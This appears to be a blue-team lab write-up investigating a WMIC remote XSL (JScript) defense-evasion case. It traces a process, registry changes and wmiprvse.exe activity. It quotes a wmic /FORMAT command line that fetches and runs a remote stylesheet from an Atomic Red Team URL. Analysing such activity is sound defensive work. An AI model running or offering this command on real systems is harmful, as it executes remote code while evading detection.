Defense Evasion – WMIC Remote XSL JScript Case
Initial Investigation

Since the case title contains JScript, start the investigation by searching for the JScript keyword.

The search shows a JScript-related process that loads three legitimate DLLs. The Process ID (PID) is 1064.

Image

Process Investigation

Next, search for Process ID 1064 to identify the activity performed by the process.

During the investigation, files were observed being created, along with changes to Internet Settings registry keys. The following command line was also observed:

wmic process list /FORMAT:"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl"

The command uses WMIC to retrieve and process a remote XSL stylesheet.

Image

WMIPRVSE Activity

The investigation also identified the following process:

wmiprvse.exe -secured -Embedding

This indicates that WMI Provider Host (WMIPrvSE) was used in a secured/isolated environment to perform WMI-related operations.

Image

Overall Activity

In this investigation, wmic.exe was executed with the /FORMAT option to access a remote XSL file. The remote stylesheet was then processed through WMI, while wmiprvse.exe was involved in executing the WMI activity in a secured environment.

The activity is associated with Defense Evasion, as WMIC can be abused to execute or process remote XSL content while blending the activity with legitimate Windows management functionality.
